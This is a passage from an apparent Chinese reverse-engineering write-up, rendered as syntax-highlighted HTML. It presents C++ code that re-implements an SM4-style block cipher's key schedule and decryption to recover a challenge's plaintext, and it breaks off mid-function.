loading=\"lazy\"></p>\n<p>key是main函数两次memcpy那边的数据，结果如下。</p>\n<p><img src=\"/images/1742733798575-ba99240d-931c-4963-aecb-87467e43e57a.png\" loading=\"lazy\"></p>\n<p>解密代码：</p>\n<pre class=\"language-cpp\" data-language=\"cpp\"><code class=\"language-cpp\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;iostream></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;windows.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;vector></span></span>\n\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> byte_7FF699A4A0D0<span class=\"token punctuation\">[</span><span class=\"token number\">256</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n<span class=\"token number\">0xD1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x16</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x05</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">0x2B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x67</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x76</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x44</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x13</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x26</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x49</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x86</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x06</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x99</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">0x9C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x91</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x98</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x33</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x54</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x43</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xED</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x62</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">0xE4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x95</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x94</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x75</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA6</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">0x47</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x07</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x73</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x71</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x83</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x59</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x19</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x85</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA8</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x81</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x56</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x35</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">0x1E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x24</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x63</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x58</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x25</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x21</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x87</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">0xD4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x46</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x57</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x27</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x52</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x36</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9E</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">0xEA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x61</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA1</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">0xE0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x34</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x55</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x93</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x32</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x30</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE3</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">0x1D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x82</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x66</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x29</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x53</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6F</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">0xD5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x37</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x45</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x72</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x51</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">0x8D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x92</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x11</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD8</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">0x0A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x31</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x88</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x74</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB0</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">0x89</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x69</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x97</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x96</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x77</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x65</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x09</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x84</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x79</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x39</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x48</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> dword_7FF699A4A040<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n<span class=\"token number\">0x00070E15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1C232A31</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x383F464D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x545B6269</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x70777E85</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8C939AA1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA8AFB6BD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC4CBD2D9</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">0xE0E7EEF5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFC030A11</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x181F262D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x343B4249</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x50575E65</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6C737A81</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x888F969D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA4ABB2B9</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">0xC0C7CED5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDCE3EAF1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF8FF060D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x141B2229</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x30373E45</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4C535A61</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x686F767D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x848B9299</span><span class=\"token punctuation\">,</span>\n<span class=\"token number\">0xA0A7AEB5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBCC3CAD1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD8DFE6ED</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF4FB0209</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10171E25</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2C333A41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x484F565D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x646B7279</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> dword_7FF699A4A028<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n<span class=\"token number\">0xA3B1BAC6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x56AA3350</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x677D9197</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB27022DC</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">static</span> <span class=\"token keyword\">inline</span> <span class=\"token keyword\">uint32_t</span> <span class=\"token function\">rotate_left</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">uint32_t</span> x<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> n<span class=\"token punctuation\">)</span> \n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token generic-function\"><span class=\"token function\">x</span> <span class=\"token generic class-name\"><span class=\"token operator\">&lt;&lt;</span> n<span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">(</span>x <span class=\"token operator\">>></span></span></span> <span class=\"token punctuation\">(</span><span class=\"token number\">32</span> <span class=\"token operator\">-</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">generate_buf</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">uint8_t</span><span class=\"token operator\">*</span> key<span class=\"token punctuation\">,</span> <span class=\"token keyword\">uint32_t</span><span class=\"token operator\">*</span> buf<span class=\"token punctuation\">)</span> \n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> \n        <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">uint32_t</span> key_dword<span class=\"token punctuation\">;</span>\n            <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>key_dword<span class=\"token punctuation\">,</span> key <span class=\"token operator\">+</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> i<span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">uint32_t</span> converted_key <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>key_dword <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span>\n            <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>key_dword <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF00</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span>\n            <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>key_dword <span class=\"token operator\">>></span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF00</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span>\n            <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>key_dword <span class=\"token operator\">>></span> <span class=\"token number\">24</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            buf<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> dword_7FF699A4A028<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> converted_key<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token number\">32</span><span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> \n        <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">uint32_t</span> v12 <span class=\"token operator\">=</span> dword_7FF699A4A040<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> buf<span class=\"token punctuation\">[</span>j <span class=\"token operator\">+</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> buf<span class=\"token punctuation\">[</span>j <span class=\"token operator\">+</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> buf<span class=\"token punctuation\">[</span>j <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">uint8_t</span><span class=\"token operator\">*</span> v12_bytes <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">uint8_t</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>v12<span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> k <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> k <span class=\"token operator\">&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span> k<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">&#123;</span>\n                    v12_bytes<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> byte_7FF699A4A0D0<span class=\"token punctuation\">[</span>v12_bytes<span class=\"token punctuation\">[</span>k<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">uint32_t</span> rot1 <span class=\"token operator\">=</span> <span class=\"token function\">rotate_left</span><span class=\"token punctuation\">(</span>v12<span class=\"token punctuation\">,</span> <span class=\"token number\">23</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">uint32_t</span> rot2 <span class=\"token operator\">=</span> <span class=\"token function\">rotate_left</span><span class=\"token punctuation\">(</span>v12<span class=\"token punctuation\">,</span> <span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        buf<span class=\"token punctuation\">[</span>j <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>rot1 <span class=\"token operator\">^</span> rot2 <span class=\"token operator\">^</span> v12<span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> buf<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">decrypt</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">uint8_t</span><span class=\"token operator\">*</span> ciphertext<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">uint8_t</span><span class=\"token operator\">*</span> key<span class=\"token punctuation\">,</span> <span class=\"token keyword\">uint8_t</span><span class=\"token operator\">*</span> plaintext<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">uint32_t</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">36</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">uint32_t</span> buf_1<span class=\"token punctuation\">[</span><span class=\"token number\">36</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">generate_buf</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> ii <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> ii <span class=\"token operator\">&lt;</span> <span class=\"token number\">4</span><span class=\"token punctuation\">;</span> ii<span 